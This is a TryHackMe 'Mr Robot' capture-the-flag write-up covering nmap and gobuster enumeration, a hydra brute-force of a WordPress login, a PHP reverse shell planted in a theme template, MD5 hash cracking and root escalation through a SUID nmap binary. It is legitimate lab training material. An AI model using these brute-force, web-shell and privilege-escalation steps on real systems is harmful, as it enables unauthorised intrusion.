---
title: "Mr Robot CTF"
date: 2025-03-06
image: /assets/img/tryhackme/Mrrobot/mrrobot_image.jpg
description: Writeup of the TryHackMe-CTF Mr Robot CTF
categories: [TryHackMe, Medium]
tags: [linux, wordpress, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Mr Robot CTF</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Based on the Mr. Robot show, can you root this box?</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/mrrobot">https://tryhackme.com/room/mrrobot</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Mr Robot CTF.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.233.174      
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 13:16 EST
  Nmap scan report for 10.10.233.174
  Host is up (0.036s latency).
  Not shown: 65532 filtered tcp ports (no-response)
  PORT    STATE  SERVICE
  22/tcp  closed ssh
  80/tcp  open   http
  443/tcp open   https

  Nmap done: 1 IP address (1 host up) scanned in 109.20 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80,443 10.10.233.174
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 13:18 EST
  Nmap scan report for 10.10.233.174
  Host is up (0.11s latency).

  PORT    STATE  SERVICE  VERSION
  22/tcp  closed ssh
  80/tcp  open   http     Apache httpd
  |_http-server-header: Apache
  |_http-title: Site doesn't have a title (text/html).
  443/tcp open   ssl/http Apache httpd
  |_http-server-header: Apache
  | ssl-cert: Subject: commonName=www.example.com
  | Not valid before: 2015-09-16T10:45:03
  |_Not valid after:  2025-09-13T10:45:03
  |_http-title: Site doesn't have a title (text/html).

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 18.09 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

The website displayed an awesome Mr. Robot-themed boot progress and command interface:

![MR Robot theme](/assets/img/tryhackme/Mrrobot/thm_mrrobot_1.jpg)

After interacting with it for a bit, I didn't find anything interesting and moved on to directory enumeration:

```bash
$ gobuster dir --url http://10.10.233.174/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.233.174/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              html,txt,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 214]
  /index.html           (Status: 200) [Size: 1188]
  /images               (Status: 301) [Size: 236] [--> http://10.10.233.174/images/]
  /index.php            (Status: 301) [Size: 0] [--> http://10.10.233.174/]
  /blog                 (Status: 301) [Size: 234] [--> http://10.10.233.174/blog/]
  /rss                  (Status: 301) [Size: 0] [--> http://10.10.233.174/feed/]
  /sitemap              (Status: 200) [Size: 0]
  /login                (Status: 302) [Size: 0] [--> http://10.10.233.174/wp-login.php]
  /0                    (Status: 301) [Size: 0] [--> http://10.10.233.174/0/]
  /feed                 (Status: 301) [Size: 0] [--> http://10.10.233.174/feed/]
  /video                (Status: 301) [Size: 235] [--> http://10.10.233.174/video/]
  /image                (Status: 301) [Size: 0] [--> http://10.10.233.174/image/]
  /atom                 (Status: 301) [Size: 0] [--> http://10.10.233.174/feed/atom/]
  /wp-content           (Status: 301) [Size: 240] [--> http://10.10.233.174/wp-content/]
  /admin                (Status: 301) [Size: 235] [--> http://10.10.233.174/admin/]
  /audio                (Status: 301) [Size: 235] [--> http://10.10.233.174/audio/]
  /intro                (Status: 200) [Size: 516314]
  /wp-login             (Status: 200) [Size: 2613]
  /wp-login.php         (Status: 200) [Size: 2613]
  /css                  (Status: 301) [Size: 233] [--> http://10.10.233.174/css/]
  /rss2                 (Status: 301) [Size: 0] [--> http://10.10.233.174/feed/]
  /license              (Status: 200) [Size: 309]
  /license.txt          (Status: 200) [Size: 309]
  /wp-includes          (Status: 301) [Size: 241] [--> http://10.10.233.174/wp-includes/]
  /readme               (Status: 200) [Size: 64]
  /readme.html          (Status: 200) [Size: 64]
  /js                   (Status: 301) [Size: 232] [--> http://10.10.233.174/js/]
  /wp-register.php      (Status: 301) [Size: 0] [--> http://10.10.233.174/wp-login.php?action=register]
  /wp-rss2.php          (Status: 301) [Size: 0] [--> http://10.10.233.174/feed/]
  /rdf                  (Status: 301) [Size: 0] [--> http://10.10.233.174/feed/rdf/]
  /page1                (Status: 301) [Size: 0] [--> http://10.10.233.174/]
  /robots               (Status: 200) [Size: 41]
  /robots.txt           (Status: 200) [Size: 41]
```

While `gobuster` was running, I manually searched for common files and found two entries in `robots.txt`, which I downloaded: 
```bash
User-agent: *
fsocity.dic
key-1-of-3.txt
```

The first flag inside `key-1-of-3.txt` and the `fsocity.dic` seemed to be a wordlist that might be useful later:
```bash
$ cat key-1-of-3.txt
	[removed]
$ wc -l fsocity.dic                                  
	858160 fsocity.dic
```

Since the `gobuster` scan was completed, I started checking the directories one by one. Nothing useful - except for a WordPress instance. I used `wpscan` to check for version numbers, plugins or vulnerabilities, but nothing useful came up. Keeping the wordlist in mind, I attempted a brute-force login. Finding a valid username was easy: I simply searched for `mr robot character name list`, tried a few, and got a hit:

![WordPress login](/assets/img/tryhackme/Mrrobot/thm_mrrobot_2.jpg)

Because the wordlist was quite large, I used `hydra`, since it allows a higher number of parallel connections compared to `wpscan`. However, the estimated time was over five hours, so I canceled the process after five minutes. Assuming the password was somewhere in the wordlist, I reversed it using `tac` and tried again:  
```bash
$ cat fsocity.dic | tac > reverse_fsocity.dic
$ hydra -l 'elliot' -P reverse_fsocity.dic 10.10.211.229 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered"
	[80][http-post-form] host: 10.10.211.229   login: elliot   password: [removed]
```

Great! I was able to log in. From here, I injected a PHP reverse shell into the `404` template.

![404 Template](/assets/img/tryhackme/Mrrobot/thm_mrrobot_3.jpg)

After setting up a listener, I triggered the shell by visiting a non-existent page:
```bash
$ whoami
	daemon
$ cat key-2-of-3.txt 
	cat: key-2-of-3.txt: Permission denied
```

## Privilege Escalation robot

Since I had initial access I performed some stabilization and started to explore the machine. I found a file with an interesting extension:
```bash
daemon@linux:/home/robot$ cat password.raw-md5 
	robot:[removed]
```

A quick lookup on Crackstation revealed the plaintext password for `robot`. Using it, I retrieved the second flag:

![Crackstation](/assets/img/tryhackme/Mrrobot/thm_mrrobot_4.jpg)

```bash
daemon@linux:/home/robot$ su robot
Password: 
robot@linux:~$ cat key-2-of-3.txt 
	[removed]
```

## Privilege Escalation root

I started by checking `sudo -l`, but I had no permission. Next, I checked the sudo version, tried an exploit, but had no success. Checking for binaries with the SUID set, I found something interesting:
```bash
robot@linux:/var/tmp$ find / -perm /4000 -type f 2>/dev/null
[...]
	/usr/local/bin/nmap
[...]
```

A quick search on <a href="https://gtfobins.github.io/gtfobins/nmap/">GTFOBins</a> provided me everthing I needed:
```bash
robot@linux:/var/tmp$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# cd /root
# ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
	[removed]
```

solved! :)
